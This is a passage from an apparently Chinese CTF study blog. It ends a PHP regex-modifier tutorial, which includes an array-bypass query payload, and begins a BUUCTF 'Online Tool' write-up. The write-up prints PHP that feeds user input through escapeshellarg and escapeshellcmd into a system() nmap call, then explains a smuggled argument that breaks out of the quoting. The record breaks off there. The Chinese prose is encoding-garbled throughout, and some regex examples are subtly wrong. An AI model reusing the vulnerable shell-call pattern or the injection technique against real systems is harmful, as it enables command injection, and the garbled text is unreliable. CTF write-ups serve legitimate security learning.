CXK!</span><br></pre></td></tr></table></figure></div>

<p>é¢˜ç›®æŒºç®€å•çš„ï¼Œæ•°ç»„ç»•è¿‡å°±å¯ä»¥äº†ï¼ŒPayloadå¦‚ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?str[]&#x3D;123&amp;num&#x3D;123</span><br></pre></td></tr></table></figure></div>

<p>ä½†æ˜¯æ­£åˆ™è¿˜æ˜¯å¯ä»¥ç»†å“çš„</p>
<hr>
<h1 id="æ­£åˆ™è¡¨è¾¾å¼-æ¨¡å¼ä¿®æ­£ç¬¦"><a href="#æ­£åˆ™è¡¨è¾¾å¼-æ¨¡å¼ä¿®æ­£ç¬¦" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼ - æ¨¡å¼ä¿®æ­£ç¬¦"></a>æ­£åˆ™è¡¨è¾¾å¼ - æ¨¡å¼ä¿®æ­£ç¬¦</h1><h2 id="ä¿®æ­£ç¬¦-iï¼ˆignoreï¼‰"><a href="#ä¿®æ­£ç¬¦-iï¼ˆignoreï¼‰" class="headerlink" title="ä¿®æ­£ç¬¦ iï¼ˆignoreï¼‰"></a>ä¿®æ­£ç¬¦ iï¼ˆignoreï¼‰</h2><p><code>i</code> ä¸åŒºåˆ†å¤§å°å†™çš„åŒ¹é…<br>â€œ<code>/abc/i</code>â€œ å¯ä»¥ä¸ <code>abc</code> æˆ– <code>aBC</code> æˆ– <code>ABc</code> ç­‰åŒ¹é…ã€‚</p>
<h2 id="ä¿®æ­£ç¬¦-m-more-å¤šè¡ŒåŒ¹é…"><a href="#ä¿®æ­£ç¬¦-m-more-å¤šè¡ŒåŒ¹é…" class="headerlink" title="ä¿®æ­£ç¬¦ m(more) å¤šè¡ŒåŒ¹é…"></a>ä¿®æ­£ç¬¦ m(more) å¤šè¡ŒåŒ¹é…</h2><p>åŒºåˆ†å¤§å°å†™<br>è‹¥å­˜åœ¨æ¢è¡Œ <code>\n</code>ï¼Œå¹¶ä¸”å¼€å§‹ä½¿ç”¨ <code>^</code> æˆ– <code>$</code> ç»“æŸç¬¦å·çš„æƒ…å†µä¸‹ï¼Œ å’Œ <code>g</code> ä¸€èµ·ä½¿ç”¨å®ç°å…¨å±€åŒ¹é…ï¼Œå› ä¸ºå­˜åœ¨æ¢è¡Œæ—¶é»˜è®¤ä¼šæŠŠæ¢è¡Œç¬¦ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä»»åŠ¡åŒ¹é…å­—ç¬¦ä¸²æ˜¯ä¸ªå•è¡Œï¼Œ <code>g</code> åªåŒ¹é…ç¬¬ä¸€è¡Œï¼Œæ·»åŠ  <code>m</code> ä¹‹åå®ç°å¤šè¡Œï¼Œæ¯ä¸ªæ¢è¡Œç¬¦ä¹‹åå°±æ˜¯å¼€å§‹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pattern = <span class="string">'/^yakko/m'</span>;</span><br><span class="line">$string = <span class="string">'xiaohei</span></span><br><span class="line"><span class="string">yakkomana</span></span><br><span class="line"><span class="string">dsadsa'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match($pattern, $string, $arr)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"æ­£åˆ™è¡¨è¾¾å¼&lt;b&gt;&#123;$pattern&#125;&lt;/b&gt;å’Œå­—ç¬¦ä¸²&lt;b&gt;&#123;$string&#125;&lt;/b&gt;åŒ¹é…æˆåŠŸ&lt;/br&gt;"</span>;</span><br><span class="line">    print_r($arr);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;font color='red'&gt;æ­£åˆ™è¡¨è¾¾å¼&#123;$pattern&#125;å’Œå­—ç¬¦ä¸²&#123;$string&#125;åŒ¹é…å¤±è´¥&lt;/font&gt;&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">æ­£åˆ™è¡¨è¾¾å¼/^yakko/må’Œå­—ç¬¦ä¸²xiaohei yakkomana dsadsaåŒ¹é…æˆåŠŸ</span><br><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; yakko )</span><br></pre></td></tr></table></figure></div>

<p>å›æ˜¾æˆåŠŸã€‚ä½†æ˜¯ <code>æˆ‘ä»¬åœ¨ä½¿ç”¨æ¨¡å¼ä¿®æ­£ç¬¦mçš„æ—¶å€™</code>ï¼Œå°†<strong>åŒ¹é…å­—ç¬¦ä¸²</strong>çœ‹æˆæ˜¯<code>å¤šè¡Œè€Œä¸æ˜¯é»˜è®¤çš„å•è¡Œ</code>ï¼Œæ‰€ä»¥<strong>ä»»ä½•ä¸€è¡Œåªè¦æ˜¯ä»¥ <code>abc</code> å¼€å¤´</strong>ï¼Œå°±åŒ¹é…æˆåŠŸã€‚ä½†æ˜¯ï¼Œå¦‚æœèƒ½åŒ¹é…çš„è¡Œå‰é¢æœ‰ç©ºæ ¼çš„è¯ï¼Œå°±ä¸èƒ½åŒ¹é…äº†!é™¤éä¿®æ”¹æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…æ¨¡å¼ã€‚ </p>
<hr>
<h2 id="ä¿®æ­£ç¬¦-s"><a href="#ä¿®æ­£ç¬¦-s" class="headerlink" title="ä¿®æ­£ç¬¦ s"></a>ä¿®æ­£ç¬¦ s</h2><p>é»˜è®¤ <code>åœ†ç‚¹.</code> æ˜¯åŒ¹é…é™¤ <code>æ¢è¡Œç¬¦\n</code> ä¹‹å¤–çš„ä»»ä½•å•å­—ç¬¦ï¼ŒåŠ ä¸Š <code>s</code> å <code>.</code> ä¸­åŒ…å«æ¢è¡Œç¬¦å·</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pattern = <span class="string">'/a.*c/s'</span>;</span><br><span class="line">$string = <span class="string">'dsadsaasd </span></span><br><span class="line"><span class="string">c'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match($pattern, $string, $arr)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"æ­£åˆ™è¡¨è¾¾å¼&lt;b&gt;&#123;$pattern&#125;&lt;/b&gt;å’Œå­—ç¬¦ä¸²&lt;b&gt;&#123;$string&#125;&lt;/b&gt;åŒ¹é…æˆåŠŸ&lt;br&gt;"</span>;</span><br><span class="line">print_r($arr);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;font color='red'&gt;æ­£åˆ™è¡¨è¾¾å¼&#123;$pattern&#125;å’Œå­—ç¬¦ä¸²&#123;$string&#125;åŒ¹é…å¤±è´¥&lt;/font&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">æ­£åˆ™è¡¨è¾¾å¼/a.*c/så’Œå­—ç¬¦ä¸²dsadsaasd  cåŒ¹é…æˆåŠŸ</span><br><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; adsaasd  c )</span><br></pre></td></tr></table></figure></div>

<p>å»æ‰ <code>s</code> åï¼ŒåŒ¹é…å°±æ˜¯å¤±è´¥ã€‚</p>
<h2 id="ä¿®æ­£ç¬¦-g-global"><a href="#ä¿®æ­£ç¬¦-g-global" class="headerlink" title="ä¿®æ­£ç¬¦ g(global)"></a>ä¿®æ­£ç¬¦ g(global)</h2><p>å…¨å±€åŒ¹é…ï¼Œå¦‚æœä¸å¸¦ <code>g</code>ï¼Œæ­£åˆ™è¿‡ç¨‹ä¸­å­—ç¬¦ä¸²ä»å·¦åˆ°å³åŒ¹é…ï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„å³åŒ¹é…æˆåŠŸ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">'aaaaaaaa'</span></span><br><span class="line"><span class="keyword">var</span> reg1 = <span class="string">'/a/'</span>;</span><br><span class="line">    str.match(reg1); <span class="comment">// ç»“æœä¸ºï¼š aaaaaaaa</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> reg2 = <span class="string">'/a/g'</span>;</span><br><span class="line">    str.match(reg2); <span class="comment">// ç»“æœä¸º: "a", "a", ..."a"</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="ä¿®æ­£ç¬¦-x"><a href="#ä¿®æ­£ç¬¦-x" class="headerlink" title="ä¿®æ­£ç¬¦ x"></a>ä¿®æ­£ç¬¦ x</h2><p>å°†æ¨¡å¼é‡Œçš„ <code>ç©ºæ ¼</code> æ¶ˆé™¤</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>Â </span><br><span class="line">$pattern = <span class="string">'/a c/x'</span>;Â </span><br><span class="line">$string = <span class="string">'a c'</span>;Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match($pattern, $string, $arr)) &#123;Â </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"æ­£åˆ™è¡¨è¾¾å¼&lt;b&gt;&#123;$pattern&#125;&lt;/b&gt;å’Œå­—ç¬¦ä¸²&lt;b&gt;&#123;$string&#125;&lt;/b&gt;åŒ¹é…æˆåŠŸ&lt;br&gt;"</span>;Â </span><br><span class="line">    print_r($arr);Â </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;Â </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;font color='red'&gt;æ­£åˆ™è¡¨è¾¾å¼&#123;$pattern&#125;å’Œå­—ç¬¦ä¸²&#123;$string&#125;åŒ¹é…å¤±è´¥&lt;/font&gt;"</span>;Â </span><br><span class="line">&#125;Â </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span>Â </span><br><span class="line"></span><br><span class="line">ç»“æœå›æ˜¾åŒ¹é…å¤±è´¥</span><br></pre></td></tr></table></figure></div>

<p>å› ä¸ºä½¿ç”¨æ¨¡å¼ä¿®æ­£ç¬¦xå–æ¶ˆäº†æ¨¡å¼ä¸­çš„ç©ºæ ¼ï¼Œ<strong>ä½†æ˜¯æ— æ³•ä½¿ç”¨æ¨¡å¼ä¿®æ­£ç¬¦å–æ¶ˆ <code>\s</code> è¡¨ç¤ºçš„ç©ºç™½ã€‚</strong></p>
<h2 id="æ¨¡å¼ä¿®æ­£ç¬¦-A"><a href="#æ¨¡å¼ä¿®æ­£ç¬¦-A" class="headerlink" title="æ¨¡å¼ä¿®æ­£ç¬¦ A"></a>æ¨¡å¼ä¿®æ­£ç¬¦ A</h2><p>å¼ºåˆ¶ä»ç›®æ ‡å­—ç¬¦ä¸²å¼€å¤´åŒ¹é…</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pattern = <span class="string">'/ac/A'</span>;</span><br><span class="line">$string = <span class="string">'acahgyghvbm'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match($pattern, $string, $arr)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"æ­£åˆ™è¡¨è¾¾å¼&lt;b&gt;&#123;$pattern&#125;&lt;/b&gt;å’Œå­—ç¬¦ä¸²&lt;b&gt;&#123;$string&#125;&lt;/b&gt;åŒ¹é…æˆåŠŸ&lt;br&gt;"</span>;</span><br><span class="line">    print_r($arr);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;font color='red'&gt;æ­£åˆ™è¡¨è¾¾å¼&#123;$pattern&#125;å’Œå­—ç¬¦ä¸²&#123;$string&#125;åŒ¹é…å¤±è´¥&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">æ­£åˆ™è¡¨è¾¾å¼/ac/Aå’Œå­—ç¬¦ä¸²acahgyghvbmåŒ¹é…æˆåŠŸ</span><br><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; ac )</span><br><span class="line"></span><br><span class="line">$mode=<span class="string">"/abc/A"</span>ã€‚</span><br><span class="line">å¯ä»¥ä¸ $str=<span class="string">"abcsdfi"</span> åŒ¹é…ã€‚</span><br><span class="line">ä¸å¯ä»¥ä¸ $str2=<span class="string">"sdsdabc"</span> åŒ¹é…ã€‚</span><br><span class="line">å› ä¸º $str2 ä¸æ˜¯ä»¥ abc å¼€å¤´ã€‚</span><br></pre></td></tr></table></figure></div>

<p><strong>æ¨¡å¼ä¿®æ­£ç¬¦Z</strong>è¡¨ç¤ºçš„æ˜¯ä»¥å­—ç¬¦ä¸²ç»“å°¾çš„åŒ¹é…ï¼Œå’Œ <code>A</code> çš„ç”¨æ³•æ˜¯ä¸€æ ·çš„</p>
<hr>
<h2 id="æ­£åˆ™åŒ¹é…çš„è´ªå©ªæ¨¡å¼"><a href="#æ­£åˆ™åŒ¹é…çš„è´ªå©ªæ¨¡å¼" class="headerlink" title="æ­£åˆ™åŒ¹é…çš„è´ªå©ªæ¨¡å¼"></a>æ­£åˆ™åŒ¹é…çš„è´ªå©ªæ¨¡å¼</h2><p>åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œæœ‰ä¸€ç§â€è´ªå©ªæ¨¡å¼â€ï¼Œè´ªå©ªæ¨¡å¼çš„æ„æ€å°±æ˜¯è¯´ï¼Œæ­£åˆ™è¡¨è¾¾å¼é»˜è®¤ä¼šåœ¨æŸ¥æ‰¾åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…åï¼Œç»§ç»­å°è¯•åé¢çš„åŒ¹é…ï¼Œå¦‚æœèƒ½æ‰¾åˆ°åŒ¹é…ï¼Œåˆ™åŒ¹é…æœ€å¤§çš„èŒƒå›´å­—ç¬¦ä¸²ã€‚ä½†æœ‰çš„æ—¶å€™è¿™å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å–æ¶ˆè´ªå©ªæ¨¡å¼ã€‚<br>æˆ‘ä»¬è¿˜æ˜¯å…ˆçœ‹ä¸€ä¸ªè´ªå©ªæ¨¡å¼çš„ä¾‹å­ï¼š </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pattern = <span class="string">'/&lt;b&gt;.*&lt;\/b&gt;/'</span>;</span><br><span class="line">$string = <span class="string">'&lt;b&gt;welcome&lt;/b&gt; &lt;b&gt;to&lt;/b&gt; &lt;b&gt;phpfuns&lt;/b&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match($pattern, $string, $arr)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"æ­£åˆ™è¡¨è¾¾å¼&lt;b&gt;&#123;$pattern&#125;&lt;/b&gt;å’Œå­—ç¬¦ä¸²&lt;b&gt;&#123;$string&#125;&lt;/b&gt;åŒ¹é…æˆåŠŸ&lt;br&gt;"</span>;</span><br><span class="line">    print_r($arr);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;font color='red'&gt;æ­£åˆ™è¡¨è¾¾å¼&#123;$pattern&#125;å’Œå­—ç¬¦ä¸²&#123;$string&#125;åŒ¹é…å¤±è´¥&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);    </span><br><span class="line"><span class="meta">?&gt;</span>Â </span><br><span class="line"></span><br><span class="line">æ­£åˆ™è¡¨è¾¾å¼/.*&lt;\/b&gt;/å’Œå­—ç¬¦ä¸²welcome to phpfunsåŒ¹é…æˆåŠŸ</span><br><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; welcome to phpfuns )</span><br></pre></td></tr></table></figure></div>

<p>æœ¬æ„æ˜¯åªåŒ¹é…ç¬¬ä¸€ä¸ª <code>&lt;b&gt;welcome&lt;/b&gt;</code><br>ä½†æ˜¯ç»“æœå´åŒ¹é…äº† <code>welcome to phpfuns</code> æ•´ä¸ªå­—ç¬¦ä¸²</p>
<p>å¦‚ä½•å–æ¶ˆè´ªå©ªæ¨¡å¼<br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>æ¨¡å¼ä¿®æ­£ç¬¦U</code> å’Œ <code>å…ƒå­—ç¬¦?</code> ä¸¤ç§æ–¹å¼å–æ¶ˆæ­£åˆ™è¡¨è¾¾å¼çš„è´ªå©ªæ¨¡å¼ã€‚</p>
<h3 id="U"><a href="#U" class="headerlink" title="U"></a>U</h3><p>Uï¼šåªåŒ¹é…æœ€è¿‘çš„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¸é‡å¤åŒ¹é…</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pattern = <span class="string">'/&lt;b&gt;.*&lt;\/b&gt;/U'</span>;</span><br><span class="line">$string = <span class="string">'&lt;b&gt;welcome&lt;/b&gt; &lt;b&gt;to&lt;/b&gt; &lt;b&gt;phpfuns&lt;/b&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match($pattern, $string, $arr)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"æ­£åˆ™è¡¨è¾¾å¼&lt;b&gt;&#123;$pattern&#125;&lt;/b&gt;å’Œå­—ç¬¦ä¸²&lt;b&gt;&#123;$string&#125;&lt;/b&gt;åŒ¹é…æˆåŠŸ&lt;br&gt;"</span>;</span><br><span class="line">    print_r($arr);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;font color='red'&gt;æ­£åˆ™è¡¨è¾¾å¼&#123;$pattern&#125;å’Œå­—ç¬¦ä¸²&#123;$string&#125;åŒ¹é…å¤±è´¥&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span>   </span><br><span class="line"></span><br><span class="line">æ­£åˆ™è¡¨è¾¾å¼/.*&lt;\/b&gt;/Uå’Œå­—ç¬¦ä¸²welcome to phpfunsåŒ¹é…æˆåŠŸ</span><br><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; welcome )</span><br></pre></td></tr></table></figure></div>



<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pattern = <span class="string">'/&lt;b&gt;.*?&lt;\/b&gt;/'</span>;</span><br><span class="line">$string = <span class="string">'&lt;b&gt;welcome&lt;/b&gt; &lt;b&gt;to&lt;/b&gt; &lt;b&gt;phpfuns&lt;/b&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match($pattern, $string, $arr)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"æ­£åˆ™è¡¨è¾¾å¼&lt;b&gt;&#123;$pattern&#125;&lt;/b&gt;å’Œå­—ç¬¦ä¸²&lt;b&gt;&#123;$string&#125;&lt;/b&gt;åŒ¹é…æˆåŠŸ&lt;br&gt;"</span>;</span><br><span class="line">    print_r($arr);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;font color='red'&gt;æ­£åˆ™è¡¨è¾¾å¼&#123;$pattern&#125;å’Œå­—ç¬¦ä¸²&#123;$string&#125;åŒ¹é…å¤±è´¥&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">æ­£åˆ™è¡¨è¾¾å¼/.*?&lt;\/b&gt;/å’Œå­—ç¬¦ä¸²welcome to phpfunsåŒ¹é…æˆåŠŸ</span><br><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; welcome )</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="ä¿®æ­£ç¬¦-D"><a href="#ä¿®æ­£ç¬¦-D" class="headerlink" title="ä¿®æ­£ç¬¦ D"></a>ä¿®æ­£ç¬¦ D</h2><p>å¦‚æœä½¿ç”¨ <code>$</code> é™åˆ¶ç»“å°¾å­—ç¬¦,åˆ™ä¸å…è®¸ç»“å°¾æœ‰æ¢è¡Œ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æ¨¡å¼ä¸º:$mode&#x3D;&quot;&#x2F;abc$&#x2F;&quot;; </span><br><span class="line">å¯ä»¥ä¸æœ€åæœ‰æ¢è¡Œçš„$str&#x3D;&quot;adshabc\n&quot;åŒ¹é…; </span><br><span class="line">å…ƒå­ç¬¦$ä¼šå¿½ç•¥æœ€åçš„æ¢è¡Œ\n; </span><br><span class="line">å¦‚æœæ¨¡å¼ä¸º:$mode&#x3D;&quot;&#x2F;abc&#x2F;D&quot;, </span><br><span class="line">åˆ™ä¸èƒ½ä¸$str&#x3D;&quot;adshabc\n&quot;åŒ¹é…, </span><br><span class="line">ä¿®æ­£ç¬¦Dé™åˆ¶å…¶ä¸å¯æœ‰æ¢è¡Œ;å¿…éœ€ä»¥abcç»“å°¾;</span><br></pre></td></tr></table></figure></div>

<h2 id="ä¿®æ­£ç¬¦-e"><a href="#ä¿®æ­£ç¬¦-e" class="headerlink" title="ä¿®æ­£ç¬¦ e"></a>ä¿®æ­£ç¬¦ e</h2><p>é…åˆå‡½æ•° <code>preg_replace()</code> ä½¿ç”¨ï¼Œå¯ä»¥æŠŠåŒ¹é…æ¥çš„å­—ç¬¦ä¸²å½“ä½œæ­£åˆ™è¡¨è¾¾å¼æ‰§è¡Œ</p>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://blog.csdn.net/forest_fire/article/details/50944901" target="_blank" rel="noopener">æ­£åˆ™è¡¨è¾¾å¼ä¸­æ¨¡å¼ä¿®æ­£ç¬¦ä½œç”¨è¯¦è§£</a><br><a href="http://www.360doc.com/content/18/0816/09/57605256_778653884.shtml" target="_blank" rel="noopener">æ­£åˆ™è¡¨è¾¾å¼ä¸­å¸¸ç”¨çš„æ¨¡å¼ä¿®æ­£ç¬¦</a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>BuuctfDay6</title>
    <url>/yakko117/2019/12/16/BuuctfDay6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>OKï¼Œè¿›è¡Œä»£ç å®¡è®¡<br><code>remote_addr</code>å’Œ <code>x_forwarded_for</code> ç”¨äºæœåŠ¡å™¨è·å–ip<br><code>escapeshellarg()</code> å’Œ <code>escapeshellcmd()</code> æŸ¥äº†äº›æ–‡æ¡£</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š172.17.0.2&#39; -v -d a&#x3D;1</span><br><span class="line">ç»è¿‡escapeshellargå¤„ç†åå˜æˆäº†&#39;172.17.0.2&#39;\&#39;&#39; -v -d a&#x3D;1&#39;ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚</span><br><span class="line">ç»è¿‡escapeshellcmdå¤„ç†åå˜æˆ&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a&#x3D;1\&#39;ï¼Œè¿™æ˜¯å› ä¸ºescapeshellcmdå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼šhttp:&#x2F;&#x2F;php.net&#x2F;manual&#x2F;zh&#x2F;function.escapeshellcmd.php</span><br><span class="line">æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a&#x3D;1\&#39;ï¼Œç”±äºä¸­é—´çš„\\è¢«è§£é‡Šä¸º\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„&#39;æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„&#39;é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl 172.17.0.2\ -v -d a&#x3D;1&#39;ï¼Œå³å‘172.17.0.2\å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸ºa&#x3D;1&#39;ã€‚</span><br></pre></td></tr></table></figure></div>

<p>æ²¡æ€ä¹ˆæ˜ç™½ï¼Œæ²¡äº‹ï¼Œé€šè¿‡ä¸€äº›æµ‹è¯•äº†è§£ä¸€ä¸‹</p>
<hr>
